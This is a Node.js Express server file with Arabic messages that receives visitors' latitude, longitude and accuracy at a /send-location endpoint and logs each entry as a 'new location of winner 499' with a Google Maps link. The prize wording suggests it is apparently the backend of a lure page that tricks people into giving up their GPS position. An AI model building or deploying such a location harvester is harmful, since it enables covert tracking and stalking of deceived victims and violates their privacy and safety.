require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const port = 3001;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.post('/send-location', async (req, res) => {
    try {
        const { latitude, longitude, accuracy, timestamp } = req.body;

        if (!latitude || !longitude) {
            return res.status(400).json({ 
                error: 'يجب توفير إحداثيات الموقع' 
            });
        }

        const message = `
📍 موقع جديد للرابح 499:
🌎 الإحداثيات: ${latitude}, ${longitude}
🎯 الدقة: ${accuracy || 'غير معروفة'} متر
🔗 رابط الموقع: https://www.google.com/maps?q=${latitude},${longitude}
⏰ الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}
        `;

        // تسجيل الموقع في وحدة التحكم
        console.log('تم استلام موقع جديد:', message);

        res.json({ 
            success: true, 
            message: 'تم استلام موقعك بنجاح' 
        });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ 
            error: 'حدث خطأ في معالجة البيانات' 
        });
    }
});

// للتأكد من أن الخادم يعمل
app.get('/health', (req, res) => {
    res.json({ status: 'ok', env: 'development' });
});

app.listen(port, () => {
    console.log(`الخادم يعمل على البورت ${port}`);
});